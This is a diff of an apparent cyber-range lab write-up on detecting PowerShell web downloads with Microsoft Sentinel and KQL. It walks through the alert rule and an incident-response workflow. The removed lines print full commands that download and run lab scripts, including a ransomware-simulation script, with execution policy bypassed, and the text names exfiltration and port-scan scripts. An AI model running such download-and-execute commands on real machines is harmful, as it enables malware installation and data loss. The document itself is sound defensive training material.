@@ -1,76 +1,155 @@
+# 🚨 **Incident Response Create Alert Rule (PowerShell Suspicious Web Request)** 🚨
 
-# 🛡️ Incident Response Case Study: PowerShell Script Execution via Suspicious Web Requests
+## 🛡️ **Create Alert Rule (PowerShell Suspicious Web Request)**
 
-## 📅 Summary
+### 🔍 **Explanation**
+Sometimes, malicious actors gain access to systems and attempt to download payloads or tools directly from the internet. This is often done using legitimate tools like PowerShell to blend in with normal activity. By using commands like `Invoke-WebRequest`, attackers can:
 
-While monitoring endpoint activity, a PowerShell-based suspicious web request alert was triggered. Upon investigation, two different scripts were downloaded and executed via PowerShell on a single workstation. This incident required analysis, containment, and post-incident policy changes.
+- 📥 Download files or scripts from external servers
+- 🚀 Execute them immediately, bypassing traditional defenses
+- 📡 Establish communication with Command-and-Control (C2) servers
+
+Detecting such behavior is critical to identifying and disrupting an ongoing attack! 🕵️‍♀️
+
+### **Detection Pipeline Overview**
+1. 🖥️ Processes are logged via **Microsoft Defender for Endpoint** under the `DeviceProcessEvents` table.
+2. 📊 Logs are forwarded to **Log Analytics Workspace** and integrated into **Microsoft Sentinel (SIEM)**.
+3. 🛑 An alert rule is created in **Sentinel** to trigger when PowerShell downloads remote files.
 
 ---
 
-## 🔍 Detection and Analysis
+### 🔧 **Steps to Create the Alert Rule**
 
-### 🔔 Alert:
-
-**DAKBLA-Create Alert Rule** flagged suspicious PowerShell activity on host `dakbla88`.
-
-### 🔎 Investigation:
-
-The following PowerShell commands were executed by a user:
-
-```powershell
-powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\ProgramData\pwncrypt.ps1
-
-powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\ProgramData\eicar.ps1
+#### 1️⃣ **Query Logs in Microsoft Defender**
+1. Open **Microsoft EDR**.
+2. Go to the KQL section and enter:
+```kql
+DeviceFileEvents
+| top 20 by Timestamp desc
 ```
-
-The user claimed they were attempting to install free software, after which a black screen appeared and nothing else happened.
-
-Using Microsoft Defender for Endpoint (MDE), it was confirmed both scripts **were executed**. This Kusto query was used to identify the executions:
-
-```kusto
-let TargetHostname = "dakbla88";
-let ScriptNames = dynamic(["eicar.ps1", "pwncrypt.ps1"]);
+```kql
+DeviceNetworkEvents
+| top 20 by Timestamp desc
+```
+```kql
 DeviceProcessEvents
-| where DeviceName == TargetHostname
+| top 20 by Timestamp desc
+```
+3. Locate suspicious activity, e.g., `powershell.exe` executing `Invoke-WebRequest`.
+4. Refine query for target device:
+   ```kql
+   let TargetDevice = "windows-target-1";
+   DeviceProcessEvents
+   | where DeviceName == TargetDevice
+   | where FileName == "powershell.exe"
+   | where ProcessCommandLine contains "Invoke-WebRequest"
+   ```
+![Screenshot 2025-01-07 105629](https://github.com/user-attachments/assets/418f503e-ebab-4cb4-9541-8c1c30ccc56a)
+
+5. Verify payload detection. ✅
+```kql
+   let TargetHostname = "windows-target-1"; // Replace with the name of your VM as it shows up in the logs
+let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]); // Add the name of the scripts that were downloaded
+DeviceProcessEvents
+| where DeviceName == TargetHostname // Comment this line out for MORE results
 | where FileName == "powershell.exe"
 | where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
 | order by TimeGenerated
-| project TimeGenerated, AccountName, DeviceName, ProcessCommandLine, FileName
-| summarize Count = count() by AccountName, DeviceName, ProcessCommandLine, FileName
+| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
+| summarize Count = count() by AccountName, DeviceName, FileName, ProcessCommandLine
 ```
 
-### 🧪 Script Behavior (from Malware Team):
+![Screenshot 2025-01-07 144444](https://github.com/user-attachments/assets/9520d3df-b646-4ce6-a72e-52e1eaedc3f4)
 
-* **`pwncrypt.ps1`**:
-  *Creates fake sensitive company files on the user’s Desktop, encrypts them using AES, and drops ransom instructions demanding Bitcoin.*
 
-* **`eicar.ps1`**:
-  *Generates the standard EICAR antivirus test file to simulate malware detection.*
+#### 2️⃣ **Create Alert Rule in Microsoft Sentinel**
+1. Open **Sentinel** and navigate to:
+   `Analytics → Scheduled Query Rule → Create Alert Rule`
+2. Fill in the following details:
+   - **Rule Name**: PowerShell Suspicious Web Request 🚩
+   - **Description**: Detects PowerShell downloading remote files 📥.
+   - **KQL Query**:
+     ```kql
+     let TargetDevice = "windows-target-1";
+     DeviceProcessEvents
+     | where DeviceName == TargetDevice
+     | where FileName == "powershell.exe"
+     | where ProcessCommandLine contains "Invoke-WebRequest"
+     ```
+   - **Run Frequency**: Every 4 hours 🕒
+   - **Lookup Period**: Last 24 hours 📅
+   - **Incident Behavior**: Automatically create incidents and group alerts into a single incident per 24 hours.
+3. Configure **Entity Mappings**:
+   - **Account**: `AccountName`
+   - **Host**: `DeviceName`
+   - **Process**: `ProcessCommandLine`
+4. Enable **Mitre ATT&CK Framework Categories** (Use ChatGPT to assist! 🤖).
+5. Save and activate the rule. 🎉
+
+![Screenshot 2025-01-07 131945](https://github.com/user-attachments/assets/2cb640e9-9471-4439-a545-e3395bd2fd16)
+
+
+---
+
+## 🛠️ **Work the Incident**
+Follow the **NIST 800-161: Incident Response Lifecycle**:
+
+### 1️⃣ **Preparation** 📂
+- Define roles, responsibilities, and procedures 🗂️.
+- Ensure tools, systems, and training are in place 🛠️.
+
+### 2️⃣ **Detection and Analysis** 🕵️‍♀️
+1. **Validate Incident**:
+   - Assign it to yourself and set the status to **Active** ✅.
+
+2. **Investigate**:
+   - Review logs and entity mappings 🗒️.
+   - Check PowerShell commands:
+     ```plaintext
+     powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri <URL> -OutFile <Path>
+     ```
+   - Identify downloaded scripts:
+     - `portscan.ps1`
+     - `pwncrypt.ps1`
+     - `eicar.ps1`
+     - `exfiltratedata.ps1`
+3. Gather evidence:
+   - Scripts downloaded and executed 🧪.
+   - User admitted to downloading free software during the events.
+
+### 3️⃣ **Containment, Eradication, and Recovery** 🛡️
+1. Isolate affected systems:
+   - Use **Defender for Endpoint** to isolate the machine 🔒.
+   - Run anti-malware scans.
+2. Analyze downloaded scripts:
+
+3. Remove threats and restore systems:
+   - Confirm scripts executed.
+   - Clean up affected files and verify machine integrity 🧹.
+
+### 4️⃣ **Post-Incident Activities** 📝
+1. Document findings and lessons learned 🖊️.
+   - Scripts executed: `pwncrypt.ps1` , `exfiltratedata.ps1` , `portscan.ps1` , `eicar.ps1` .
+   - Account involved: `system-user`.
+2. Update policies:
+   - Restrict PowerShell usage 🚫.
+   - Enhance cybersecurity training programs 📚.
+3. Finalize reporting and close the case:
+   - Mark incident as **True Positive** ✅. 
 
 ---
 
-## ❌ Containment, Eradication & Recovery
-
-* Isolated the affected machine using Microsoft Defender for Endpoint.
-* Performed a full anti-malware scan (results came back clean).
-* Removed the device from isolation.
-
----
-
-## ✅ Post-Incident Actions
-
-* The user completed **additional cybersecurity awareness training**.
-* Upgraded our security awareness platform with **KnowBe4** and increased training frequency.
-* Began enforcing a **PowerShell restriction policy** for non-essential users.
+## 🎯 **Incident Summary**
+| **Metric**                     | **Value**                        |
+|---------------------------------|-----------------------------------|
+| **Affected Device**            | `windows-target-1`               |
+| **Suspicious Commands**        | 4                                |
+| **Scripts Downloaded**         | `portscan.ps1`, `pwncrypt.ps1`, `eicar.ps1`, `exfiltratedata.ps1`   |
+| **Incident Status**            | Resolved                         |
 
 ---
 
-## 💡 Key Takeaways
+🎉 **Great Job Securing Your Environment!** 🔒
 
-* PowerShell can be easily misused to download and execute scripts — restricting its use is critical.
-* Defender for Endpoint and Kusto queries are powerful tools for identifying post-execution activity.
-* Security awareness and proper alerting rules can significantly reduce incident response time.
-
----
 
 
